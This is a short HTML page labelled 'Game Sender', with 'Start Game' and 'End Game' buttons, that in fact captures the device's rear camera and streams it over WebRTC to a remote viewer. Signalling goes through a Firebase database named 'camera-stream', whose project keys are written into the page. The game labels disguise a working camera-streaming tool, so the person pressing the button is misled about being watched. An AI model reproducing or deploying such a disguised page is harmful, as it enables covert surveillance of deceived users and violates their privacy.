<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Game Sender</title>
<style>
  body {
    background:#111;
    color:#fff;
    font-family:Arial;
    text-align:center;
    padding-top:40px;
  }
  button {
    padding:12px 25px;
    font-size:16px;
    margin:10px;
    border:none;
    border-radius:6px;
    cursor:pointer;
    background:#00aaff;
    color:white;
  }
</style>
</head>

<body>

<h2>ðŸŽ® Game Sender</h2>

<button id="startBtn">Start Game</button>
<button id="endBtn">End Game</button>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getDatabase, ref, set, onValue, push } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCMD_qYKFZQZveZQL1NX7oj3oFuTsRxaYI",
  authDomain: "camera-stream-15427.firebaseapp.com",
  databaseURL: "https://camera-stream-15427-default-rtdb.firebaseio.com",
  projectId: "camera-stream-15427",
  storageBucket: "camera-stream-15427.appspot.com",
  messagingSenderId: "437543558160",
  appId: "1:437543558160:web:32a8d80fdcd95b0568fe95"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const room = "room1";

let pc;
let stream;

document.getElementById("startBtn").onclick = async () => {
  pc = new RTCPeerConnection({
    iceServers: [{ urls:"stun:stun.l.google.com:19302" }]
  });

  pc.onicecandidate = e => {
    if (e.candidate) {
      push(ref(db, room + "/candidates"), e.candidate.toJSON());
    }
  };

  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "environment" }
  });

  stream.getTracks().forEach(track => pc.addTrack(track, stream));

  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  await set(ref(db, room + "/offer"), offer);

  onValue(ref(db, room + "/answer"), snap => {
    if (snap.exists()) {
      pc.setRemoteDescription(snap.val());
    }
  });
};

document.getElementById("endBtn").onclick = () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
  if (pc) pc.close();
};
</script>

</body>
</html>
